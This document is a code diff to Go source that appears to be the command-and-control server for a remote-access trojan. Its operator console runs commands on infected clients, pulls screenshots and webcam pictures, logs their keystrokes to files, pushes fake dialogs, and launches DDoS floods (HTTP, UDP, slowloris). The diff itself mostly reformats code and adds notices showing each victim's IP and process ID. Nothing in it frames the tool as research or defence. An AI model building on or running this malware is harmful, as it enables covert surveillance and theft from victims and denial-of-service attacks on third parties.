@@ -67,10 +67,13 @@ var dialog_done bool
 
 var timeout int = 30
 
+var connect_header string = ""
+var disconnect_header string = ""
+
 var (
 	history_fn = filepath.Join(os.TempDir(), ".liner_history")
 	commands   = []string{
-    "list_clients",
+		"list_clients",
 		"screenshot",
 		"settimeout",
 		"cleartext",
@@ -85,11 +88,6 @@ var (
 		"pic",
 	}
 )
-
-// var client_map = map[string]string{
-// 	"0": "client_1",
-// 	"1": "client_2",
-// }
 
 var flood_completed bool
 
@@ -163,6 +161,22 @@ func main() {
 			}
 		}()
 
+		go func() {
+			if len(connect_header) > 0 {
+				color.Green.Println(tm.ResetLine(connect_header))
+				connect_header = ""
+				tm.Flush()
+				tm.MoveCursorDown(2)
+			}
+
+			if len(disconnect_header) > 0 {
+				color.Red.Println(tm.ResetLine(disconnect_header))
+				disconnect_header = ""
+				tm.Flush()
+				tm.MoveCursorDown(2)
+			}
+		}()
+
 		in, err := line.Prompt(">> ")
 		if err == liner.ErrPromptAborted {
 			log.Print("Aborted")
@@ -172,9 +186,9 @@ func main() {
 			break
 		}
 
-		in = strings.TrimSpace(in)
-
 		line.AppendHistory(in)
+
+		in = strings.TrimSpace(in)
 
 		fields := strings.Fields(in)
 
@@ -189,7 +203,9 @@ func main() {
 					for idx := range commands {
 						color.Green.Println(commands[idx])
 					}
-					color.Yellow.Println("to see the help page for a specific command type [help <command>]")
+					color.Yellow.Println(
+						"to see the help page for a specific command type [help <command>]",
+					)
 				} else {
 					var found_command bool
 
@@ -240,7 +256,7 @@ func main() {
 						color.Gray.Println("usage: [exit]")
 					case "flood":
 						color.Green.Print("flood: ")
-						log.Println("performs a DDOS attack against a specified target. (supported methods are: httpflood, udpflood, slowloris)")
+						log.Println("performs a DDOS attack against a specified target. (methods are: httpflood, udpflood, slowloris)")
 						color.Gray.Println("usage: [flood <target url> <seconds> <worker count> <method>]")
 					case "pic":
 						color.Green.Print("pic: ")
@@ -250,6 +266,10 @@ func main() {
 						color.Green.Print("clear: ")
 						log.Println("clears the terminal screen.")
 						color.Gray.Println("usage: [clear]")
+					case "settimeout":
+						color.Green.Print("settimeout: ")
+						log.Println("sets the timeout for dialog and exec commands.")
+						color.Gray.Println("usage: [settimeout <timeout>]")
 					}
 				}
 
@@ -391,7 +411,7 @@ func main() {
 
 				timeout = val
 
-        ShowOk()
+				ShowOk()
 
 			case "exec":
 				if len(fields[1:]) < 1 {
@@ -408,28 +428,31 @@ func main() {
 
 				exec_done = false
 
-				ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
+				ctx, cancel := context.WithTimeout(
+					context.Background(),
+					time.Duration(timeout)*time.Second,
+				)
 
-        wait_exec := func() {
+				wait_exec := func() {
 					for {
 						select {
 						case <-ctx.Done():
 							color.Red.Println("exec timed out.")
 							client_execoutput[current_id] = ""
-              return
+							return
 						default:
-						  if exec_done {
-                return
-              }
-            }
-          }
+							if exec_done {
+								return
+							}
+						}
+					}
 				}
 
-        wait_exec()
-        cancel()
+				wait_exec()
+				cancel()
 
 				log.Println(client_execoutput[current_id])
-        client_execoutput[current_id] = ""
+				client_execoutput[current_id] = ""
 
 			case "dialog":
 				if current_id == "" {
@@ -453,32 +476,39 @@ func main() {
 					color.Red.Println("dialog only takes two arguments")
 				}
 
-				dialog_params = &DialogParams{ShouldUpdate: true, DialogPrompt: matches[0], DialogTitle: matches[1]}
+				dialog_params = &DialogParams{
+					ShouldUpdate: true,
+					DialogPrompt: matches[0],
+					DialogTitle:  matches[1],
+				}
 
-        dialog_done = false
+				dialog_done = false
 
-        ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout) * time.Second)
+				ctx, cancel := context.WithTimeout(
+					context.Background(),
+					time.Duration(timeout)*time.Second,
+				)
 
-        wait_dialog := func(){
-          for {
-            select {
-            case <-ctx.Done():
-              color.Red.Println("dialog timed out.")
-              client_dialogoutput[current_id] = ""
-              return
-            default:
-              if dialog_done {
-                return
-              }
-            }
-          }
-        }
+				wait_dialog := func() {
+					for {
+						select {
+						case <-ctx.Done():
+							color.Red.Println("dialog timed out.")
+							client_dialogoutput[current_id] = ""
+							return
+						default:
+							if dialog_done {
+								return
+							}
+						}
+					}
+				}
 
-        wait_dialog()
-        cancel()
+				wait_dialog()
+				cancel()
 
 				log.Println(client_dialogoutput[current_id])
-        client_dialogoutput[current_id] = ""
+				client_dialogoutput[current_id] = ""
 
 			case "clear":
 				tm.Clear()
@@ -506,14 +536,22 @@ exit:
 }
 
 func FloodCommand(target *url.URL, limit time.Duration, workersN int64, method string) {
-	log.Println(color.Green.Sprintf("flooding %s for %s seconds with %d workers using %s method", target.String(), limit, workersN, method))
+	log.Println(
+		color.Green.Sprintf(
+			"flooding %s for %s seconds with %d workers using %s method",
+			target.String(),
+			limit,
+			workersN,
+			method,
+		),
+	)
 
 	var floodtype int
 	switch method {
 	case "httpflood":
 		floodtype = 1
 	case "udpflood":
-		floodtype = 3
+		floodtype = 2
 	case "slowloris":
 		floodtype = 0
 	default:
@@ -526,7 +564,11 @@ func FloodCommand(target *url.URL, limit time.Duration, workersN int64, method s
 		time.Sleep(limit)
 		flood_completed = true
 	}()
-	bar := progressbar.NewOptions(-1, progressbar.OptionClearOnFinish(), progressbar.OptionFullWidth())
+	bar := progressbar.NewOptions(
+		-1,
+		progressbar.OptionClearOnFinish(),
+		progressbar.OptionFullWidth(),
+	)
 	for !flood_completed {
 		bar.Add(1)
 	}
@@ -565,7 +607,10 @@ func Contains(sl []string, name string) bool {
 	return false
 }
 
-func (s *server) GetCommand(ctx context.Context, cid *pb.ClientDataRequest) (*pb.ClientExecData, error) {
+func (s *server) GetCommand(
+	ctx context.Context,
+	cid *pb.ClientDataRequest,
+) (*pb.ClientExecData, error) {
 	if !Contains(client_ids, cid.ClientId) {
 		client_ids = append(client_ids, cid.ClientId)
 	}
@@ -592,7 +637,10 @@ func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) 
 	return &pb.Void{}, nil
 }
 
-func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_SubscribeOnScreenTextServer) error {
+func (s *server) SubscribeOnScreenText(
+	r *pb.ClientDataRequest,
+	in pb.Consumer_SubscribeOnScreenTextServer,
+) error {
 	if !Contains(client_ids, r.ClientId) {
 		client_ids = append(client_ids, r.ClientId)
 	}
@@ -677,7 +725,11 @@ func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.
 
 		defer file.Close()
 
-		file, err := os.OpenFile(fmt.Sprintf("screenshot-%s.jpeg", in.Id.ClientId), os.O_CREATE|os.O_WRONLY, 0644)
+		file, err := os.OpenFile(
+			fmt.Sprintf("screenshot-%s.jpeg", in.Id.ClientId),
+			os.O_CREATE|os.O_WRONLY,
+			0644,
+		)
 		if err != nil {
 			return &pb.Void{}, err
 		}
@@ -695,7 +747,11 @@ func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.
 
 	var file *os.File
 
-	file, err := os.OpenFile(fmt.Sprintf("keylog-%s.log", in.Id.ClientId), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	file, err := os.OpenFile(
+		fmt.Sprintf("keylog-%s.log", in.Id.ClientId),
+		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
+		0644,
+	)
 	if err != nil {
 		return &pb.Void{}, err
 	}
@@ -707,7 +763,10 @@ func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.
 	return &pb.Void{}, nil
 }
 
-func (s *server) GetPicture(ctx context.Context, in *pb.ClientDataRequest) (*pb.PictureData, error) {
+func (s *server) GetPicture(
+	ctx context.Context,
+	in *pb.ClientDataRequest,
+) (*pb.PictureData, error) {
 	if !Contains(client_ids, in.ClientId) {
 		client_ids = append(client_ids, in.ClientId)
 	}
@@ -730,7 +789,11 @@ func (s *server) SetPictureOutput(ctx context.Context, in *pb.PictureOutput) (*p
 		var file *os.File
 
 		defer file.Close()
-		file, err := os.OpenFile(fmt.Sprintf("webcam_pic-%s.jpg", in.Id.ClientId), os.O_CREATE|os.O_WRONLY, 0644)
+		file, err := os.OpenFile(
+			fmt.Sprintf("webcam_pic-%s.jpg", in.Id.ClientId),
+			os.O_CREATE|os.O_WRONLY,
+			0644,
+		)
 		if err != nil {
 			return &pb.Void{}, err
 		}
@@ -738,5 +801,15 @@ func (s *server) SetPictureOutput(ctx context.Context, in *pb.PictureOutput) (*p
 		file.Write(in.PictureData)
 	}
 
+	return &pb.Void{}, nil
+}
+
+func (s *server) RegisterClient(ctx context.Context, in *pb.RegisterData) (*pb.Void, error) {
+	connect_header = "\nclient connected with ip:" + in.GetIp() + " and pid:" + in.GetId().ClientId
+	return &pb.Void{}, nil
+}
+
+func (s *server) UnregisterClient(ctx context.Context, in *pb.RegisterData) (*pb.Void, error) {
+	disconnect_header = "\nclient disconnected with ip:" + in.GetIp() + " and pid:" + in.GetId().ClientId
 	return &pb.Void{}, nil
 }
